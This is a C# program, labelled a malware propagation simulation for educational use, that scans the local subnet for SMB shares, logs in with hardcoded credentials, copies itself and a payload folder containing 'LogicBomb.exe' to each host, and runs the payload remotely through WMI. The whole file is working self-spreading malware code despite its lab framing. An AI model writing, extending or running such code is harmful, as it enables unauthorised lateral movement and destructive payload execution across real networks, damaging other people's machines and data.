using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using AuthenticationLevel = System.Management.AuthenticationLevel;

class Program
{
    // Configuration - Consider moving to config file for production lab use
    private const string SMB_USERNAME = "user";
    private const string SMB_PASSWORD = "user";
    private const string SMB_SHARE_NAME = "SharedFolder";
    private const string PAYLOAD_FOLDER_NAME = "payload";
    private const string EXECUTABLE_TO_RUN = "LogicBomb.exe";

    // Operational parameters
    private const int PING_TIMEOUT_MS = 300;
    private const int MAX_CONCURRENT_SCANS = 50;
    private const int SCAN_TIMEOUT_MINUTES = 5;

    static async Task Main()
    {
        Console.WriteLine("===========================================");
        Console.WriteLine("MALWARE PROPAGATION SIMULATION - EDUCATIONAL USE ONLY");
        Console.WriteLine("===========================================");
        Console.WriteLine();

        Console.WriteLine("Starting IP Range, SMB Scan, Self-Deployment, and Remote Execution Test...");
        Console.WriteLine("-----------------------------------");

        string localIP = GetLocalIPAddress();
        if (localIP == null)
        {
            LogError("Could not detect local IP address.");
            WaitForExit();
            return;
        }

        string baseIP = string.Join(".", localIP.Split('.').Take(3));
        LogInfo($"Local IP Address detected: {localIP}");
        LogInfo($"Scanning network: {baseIP}.1 - {baseIP}.254 for active SMB servers...");

        List<string> smbHosts;
        string tempFolder = null;

        try
        {
            // Scan with timeout and progress reporting
            using (var cts = new CancellationTokenSource(TimeSpan.FromMinutes(SCAN_TIMEOUT_MINUTES)))
            {
                var progress = new Progress<ScanProgress>(p =>
                {
                    Console.Write($"\r[SCAN] Progress: {p.Completed}/254 hosts checked, {p.ActiveSmb} SMB hosts found");
                });

                smbHosts = await FindSmbServersAsync(baseIP, progress, cts.Token);
                Console.WriteLine(); // New line after progress
            }

            if (smbHosts.Count == 0)
            {
                LogInfo("No SMB servers found. Exiting.");
                WaitForExit();
                return;
            }

            LogInfo($"Found {smbHosts.Count} SMB host(s) with accessible shares.");

            // Prepare deployment package
            tempFolder = Path.Combine(Path.GetTempPath(), $"IpScannerDeployment_{Guid.NewGuid():N}");
            LogInfo($"Preparing deployment package in temporary folder: {tempFolder}");
            PrepareDeploymentPackage(tempFolder);

            // Deploy to each discovered host
            foreach (string ip in smbHosts)
            {
                await ProcessTargetHost(ip, tempFolder);
            }

            Console.WriteLine("-----------------------------------");
            LogInfo("Scan, deployment, and remote execution complete.");
        }
        catch (OperationCanceledException)
        {
            LogWarning("Operation timed out or was cancelled.");
        }
        catch (Exception ex)
        {
            LogError($"Unexpected error: {ex.Message}");
            LogError($"Stack trace: {ex.StackTrace}");
        }
        finally
        {
            // Cleanup - ensure temp folder is deleted
            if (tempFolder != null && Directory.Exists(tempFolder))
            {
                try
                {
                    LogInfo($"Deleting temporary directory: {tempFolder}");
                    Directory.Delete(tempFolder, true);
                    LogInfo("Cleanup completed successfully.");
                }
                catch (Exception ex)
                {
                    LogError($"Failed to clean up temporary folder: {ex.Message}");
                }
            }
        }

        WaitForExit();
    }

    private static async Task ProcessTargetHost(string ip, string tempFolder)
    {
        string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
        LogInfo($"Attempting SMB login on {remoteShareUNC}...");

        int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);

        if (smbConnectResult == 0)
        {
            try
            {
                LogSuccess($"Connected to {ip}. Copying deployment files...");
                await CopyFolderAsync(tempFolder, remoteShareUNC);
                LogSuccess($"Files copied to {remoteShareUNC}");

                LogInfo($"Attempting to execute '{EXECUTABLE_TO_RUN}' on {ip} using WMI...");

                string remoteServerPathToExecutable = $"C:\\{SMB_SHARE_NAME}\\{PAYLOAD_FOLDER_NAME}\\{EXECUTABLE_TO_RUN}";

                bool executionSuccess = ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteServerPathToExecutable);

                if (executionSuccess)
                {
                    LogSuccess($"'{EXECUTABLE_TO_RUN}' executed successfully on {ip}");
                }
                else
                {
                    LogWarning($"Could not execute '{EXECUTABLE_TO_RUN}' on {ip} using WMI.");
                }
            }
            catch (Exception ex)
            {
                LogError($"Error processing {ip}: {ex.Message}");
            }
            finally
            {
                DisconnectFromRemoteShare(remoteShareUNC);
            }
        }
        else
        {
            LogWarning($"SMB connection to {ip} failed - Error Code: {smbConnectResult} ({GetWNetErrorDescription(smbConnectResult)})");
        }
    }

    private static async Task<List<string>> FindSmbServersAsync(
        string baseIP,
        IProgress<ScanProgress> progress = null,
        CancellationToken cancellationToken = default)
    {
        var activeHosts = new List<string>();
        var pingTasks = new List<Task>();
        var semaphore = new SemaphoreSlim(MAX_CONCURRENT_SCANS);
        int completed = 0;
        int activeSmbCount = 0;

        for (int i = 1; i <= 254; i++)
        {
            if (cancellationToken.IsCancellationRequested)
                break;

            string ip = $"{baseIP}.{i}";
            await semaphore.WaitAsync(cancellationToken);

            pingTasks.Add(Task.Run(async () =>
            {
                try
                {
                    using (var ping = new Ping())
                    {
                        var reply = await ping.SendPingAsync(ip, PING_TIMEOUT_MS);

                        if (reply.Status == IPStatus.Success)
                        {
                            string smbPath = $"\\\\{ip}\\{SMB_SHARE_NAME}";
                            int result = ConnectToRemoteShare(smbPath, SMB_USERNAME, SMB_PASSWORD);

                            if (result == 0)
                            {
                                Console.WriteLine($"\n[ACTIVE SMB] {ip} - Share '{SMB_SHARE_NAME}' accessible");
                                lock (activeHosts)
                                {
                                    activeHosts.Add(ip);
                                    activeSmbCount++;
                                }
                                DisconnectFromRemoteShare(smbPath);
                            }
                            else
                            {
                                Console.WriteLine($"\n[ACTIVE] {ip} - Responds to ping but no accessible SMB share");
                            }
                        }
                    }
                }
                catch (PingException)
                {
                    // Expected for non-responsive hosts - suppress
                }
                catch (Exception ex)
                {
                    LogError($"{ip} - {ex.Message}");
                }
                finally
                {
                    semaphore.Release();
                    int currentCompleted = Interlocked.Increment(ref completed);
                    progress?.Report(new ScanProgress
                    {
                        Completed = currentCompleted,
                        ActiveSmb = activeSmbCount
                    });
                }
            }, cancellationToken));
        }

        await Task.WhenAll(pingTasks);
        return activeHosts;
    }

    private static void PrepareDeploymentPackage(string tempFolder)
    {
        try
        {
            Directory.CreateDirectory(tempFolder);

            // Copy current executable
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string exeName = Path.GetFileName(exePath);
            string destExePath = Path.Combine(tempFolder, exeName);

            File.Copy(exePath, destExePath, overwrite: true);
            LogInfo($"Copied {exeName} to deployment package");

            // Copy payload folder if it exists
            string payloadFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, PAYLOAD_FOLDER_NAME);

            if (Directory.Exists(payloadFolder))
            {
                string destPayloadFolder = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME);
                CopyFolderSync(payloadFolder, destPayloadFolder);
                LogInfo($"Copied '{PAYLOAD_FOLDER_NAME}' folder to deployment package");
            }
            else
            {
                LogWarning($"'{PAYLOAD_FOLDER_NAME}' folder not found at {payloadFolder}");
                LogWarning($"Please ensure '{EXECUTABLE_TO_RUN}' is in a '{PAYLOAD_FOLDER_NAME}' folder next to this program.");
            }

            LogSuccess("Deployment package prepared successfully.");
        }
        catch (Exception ex)
        {
            LogError($"Failed to prepare deployment package: {ex.Message}");
            throw;
        }
    }

    private static void CopyFolderSync(string source, string dest)
    {
        Directory.CreateDirectory(dest);

        foreach (string file in Directory.GetFiles(source))
        {
            string fileName = Path.GetFileName(file);
            File.Copy(file, Path.Combine(dest, fileName), true);
        }

        foreach (string dir in Directory.GetDirectories(source))
        {
            string dirName = Path.GetFileName(dir);
            CopyFolderSync(dir, Path.Combine(dest, dirName));
        }
    }

    private static async Task CopyFolderAsync(string source, string dest)
    {
        Directory.CreateDirectory(dest);

        var fileTasks = Directory.GetFiles(source)
            .Select(file => Task.Run(() =>
            {
                string fileName = Path.GetFileName(file);
                File.Copy(file, Path.Combine(dest, fileName), true);
            }))
            .ToList();

        await Task.WhenAll(fileTasks);

        foreach (string dir in Directory.GetDirectories(source))
        {
            string dirName = Path.GetFileName(dir);
            await CopyFolderAsync(dir, Path.Combine(dest, dirName));
        }
    }

    private static string GetLocalIPAddress()
    {
        try
        {
            var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
            return host.AddressList
                .FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                ?.ToString();
        }
        catch (Exception ex)
        {
            LogError($"Failed to get local IP address: {ex.Message}");
            return null;
        }
    }

    private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string commandToExecute)
    {
        LogInfo($"Attempting WMI execution (Win32_Process.Create) on {remoteIp}...");

        try
        {
            ConnectionOptions connOpts = new ConnectionOptions
            {
                Username = username,
                Password = password,
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.Default,
                EnablePrivileges = true,
                Authority = null,
                Timeout = TimeSpan.FromSeconds(30)
            };

            string path = $"\\\\{remoteIp}\\root\\cimv2";
            var scope = new ManagementScope(path, connOpts);

            LogInfo($"Connecting to WMI namespace: {path}");
            scope.Connect();
            LogInfo("WMI connection established");

            using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions()))
            {
                var inParams = processClass.GetMethodParameters("Create");
                inParams["CommandLine"] = commandToExecute;

                LogInfo($"Executing command: {commandToExecute}");
                var outParams = processClass.InvokeMethod("Create", inParams, null);

                if (outParams != null)
                {
                    var returnCode = Convert.ToInt32(outParams["returnValue"]);
                    var newPid = outParams["processId"] != null ? outParams["processId"].ToString() : "(none)";

                    string resultMessage = GetWmiReturnCodeDescription(returnCode);
                    LogInfo($"WMI Create returned code {returnCode}: {resultMessage}, ProcessID: {newPid}");

                    // Consider both 0 (success) and 2 (access denied but may execute) as successful attempts
                    if (returnCode == 0)
                    {
                        LogSuccess($"Remote execution successful on {remoteIp}");
                        return true;
                    }
                    else if (returnCode == 2)
                    {
                        LogWarning($"WMI returned 'Access Denied' but process may have launched on {remoteIp}");
                        return true; // For lab purposes, consider this a successful interaction
                    }
                    else
                    {
                        LogWarning($"WMI execution failed with code {returnCode}");
                    }
                }
                else
                {
                    LogWarning("WMI InvokeMethod returned null");
                }
            }
        }
        catch (ManagementException mex)
        {
            LogError($"WMI ManagementException on {remoteIp}: {mex.Message}");
            if (mex.InnerException != null)
            {
                LogError($"Inner Exception: {mex.InnerException.Message}");
            }
        }
        catch (UnauthorizedAccessException uex)
        {
            LogError($"Unauthorized Access on {remoteIp}: {uex.Message}");
            LogError("Check that credentials have appropriate WMI/DCOM permissions");
        }
        catch (System.Runtime.InteropServices.COMException comEx)
        {
            LogError($"COM Exception on {remoteIp}: {comEx.Message} (HRESULT: 0x{comEx.HResult:X})");
        }
        catch (Exception ex)
        {
            LogError($"Unexpected exception on {remoteIp}: {ex.GetType().Name} - {ex.Message}");
        }

        return false;
    }

    // P/Invoke declarations for network share connections
    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetCancelConnection2(string name, int flags, bool force);

    private static int ConnectToRemoteShare(string remotePath, string username, string password)
    {
        var nr = new NETRESOURCE
        {
            dwType = 1, // RESOURCETYPE_DISK
            lpRemoteName = remotePath
        };
        return WNetAddConnection2(ref nr, password, username, 0);
    }

    private static void DisconnectFromRemoteShare(string remotePath)
    {
        try
        {
            WNetCancelConnection2(remotePath, 0, true);
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to disconnect from {remotePath}: {ex.Message}");
        }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct NETRESOURCE
    {
        public int dwScope;
        public int dwType;
        public int dwDisplayType;
        public int dwUsage;
        public string lpLocalName;
        public string lpRemoteName;
        public string lpComment;
        public string lpProvider;
    }

    // Helper methods for logging and error descriptions
    private static void LogInfo(string message)
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.Write("[INFO] ");
        Console.ResetColor();
        Console.WriteLine(message);
    }

    private static void LogSuccess(string message)
    {
        Console.ForegroundColor = ConsoleColor.Green;
        Console.Write("[SUCCESS] ");
        Console.ResetColor();
        Console.WriteLine(message);
    }

    private static void LogWarning(string message)
    {
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.Write("[WARNING] ");
        Console.ResetColor();
        Console.WriteLine(message);
    }

    private static void LogError(string message)
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.Write("[ERROR] ");
        Console.ResetColor();
        Console.WriteLine(message);
    }

    private static string GetWmiReturnCodeDescription(int returnCode)
    {
        switch (returnCode)
        {
            case 0: return "Successful completion";
            case 2: return "Access denied";
            case 3: return "Insufficient privilege";
            case 8: return "Unknown failure";
            case 9: return "Path not found";
            case 21: return "Invalid parameter";
            default: return $"Unknown error code: {returnCode}";
        }
    }

    private static string GetWNetErrorDescription(int errorCode)
    {
        switch (errorCode)
        {
            case 0: return "Success";
            case 5: return "Access is denied";
            case 53: return "The network path was not found";
            case 86: return "The specified network password is not correct";
            case 1219: return "Multiple connections to a server not allowed";
            case 1326: return "Logon failure: unknown user name or bad password";
            default: return $"Error code {errorCode}";
        }
    }

    private static void WaitForExit()
    {
        Console.WriteLine();
        Console.WriteLine("Press any key to exit.");
        Console.ReadKey();
    }

    // Progress reporting struct
    private struct ScanProgress
    {
        public int Completed { get; set; }
        public int ActiveSmb { get; set; }
    }
}